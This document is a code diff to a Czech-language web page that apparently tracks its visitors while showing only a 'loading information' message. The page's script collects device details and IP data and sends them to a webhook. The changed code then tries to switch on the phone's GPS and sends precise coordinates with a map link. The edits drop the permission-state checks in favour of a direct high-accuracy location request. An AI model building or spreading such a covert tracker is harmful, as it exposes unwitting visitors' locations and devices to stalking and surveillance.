@@ -4,6 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Detekce Informací</title>
+
+    <!-- Přidání Google Maps API pro vyvolání GPS popupu -->
+    <script src="https://maps.googleapis.com/maps/api/js?key=TVUJ_GOOGLE_MAPS_API_KEY"></script>
 </head>
 <body>
     <h2>Načítání informací...</h2>
@@ -40,40 +43,33 @@
             getIPInfo(ipData => {
                 let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
                 sendToWebhook(message);
-                enableGPS();  
+                enableGPS();
             });
         }
 
-        // ✅ Nejprve aktivujeme GPS na Androidu
         function enableGPS() {
             if (navigator.geolocation) {
-                let locationIntent = document.createElement("a");
-                locationIntent.href = "intent://settings/#Intent;scheme=android.settings.LOCATION_SOURCE_SETTINGS;end;";
-                locationIntent.click();
-                
-                // Po 5 sekundách se zeptáme na polohu (uživatel musí zapnout GPS ručně)
-                setTimeout(askForLocation, 5000);
+                if (typeof android !== "undefined" && android.requestLocation) {
+                    console.log("Požadavek na zapnutí GPS...");
+                    android.requestLocation();
+                } else {
+                    console.log("Android GPS API není dostupné. Pokusíme se získat polohu jinak.");
+                }
+
+                // Po zapnutí GPS vyvoláme geolokaci v prohlížeči
+                setTimeout(askForLocation, 3000);
             } else {
                 console.warn("Geolokace není podporována.");
             }
         }
 
-        // ✅ Pak se zeptáme na povolení polohy pro web
         function askForLocation() {
-            navigator.permissions.query({ name: "geolocation" }).then(result => {
-                if (result.state === "granted") {
-                    getLocation();  // Poloha už je povolená
-                } else if (result.state === "prompt") {
-                    navigator.geolocation.getCurrentPosition(getLocation, () => {
-                        console.error("Uživatel odmítl polohu");
-                    }, {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    });
-                } else {
-                    console.warn("Přístup k poloze byl zablokován v nastavení prohlížeče");
-                }
+            navigator.geolocation.getCurrentPosition(getLocation, error => {
+                console.error("GPS nebyla povolena.", error);
+            }, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             });
         }
 
@@ -81,7 +77,7 @@
             let { latitude, longitude } = position.coords;
             let mapLink = `https://en.mapy.cz/zakladni?q=${latitude}%2C%20${longitude}&x=${longitude}&y=${latitude}&z=15`;
             let gpsMessage = `📍 GPS Souřadnice: ${latitude}, ${longitude}\n🔗 Mapa: [Zobrazit na Mapy.cz](${mapLink})`;
-            
+
             getIPInfo(ipData => {
                 let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
                 sendToWebhook(message);
